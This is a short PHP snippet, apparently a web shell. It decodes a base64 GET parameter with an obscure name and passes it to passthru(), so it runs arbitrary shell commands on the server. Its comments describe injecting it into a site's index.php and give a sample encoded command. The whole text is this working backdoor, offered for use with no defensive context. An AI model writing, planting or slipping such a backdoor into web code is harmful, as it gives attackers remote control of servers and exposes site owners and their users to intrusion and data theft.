<?php
// this is the simple bit of code with a known GET parameter
// to test this out, try ?n4v4ac=bHMgLWxh
// this would be injected into the index.php file for example

if (!empty($_GET['n4v4ac'])) {
  $command = base64_decode($_GET['n4v4ac']);
  passthru($command);
}
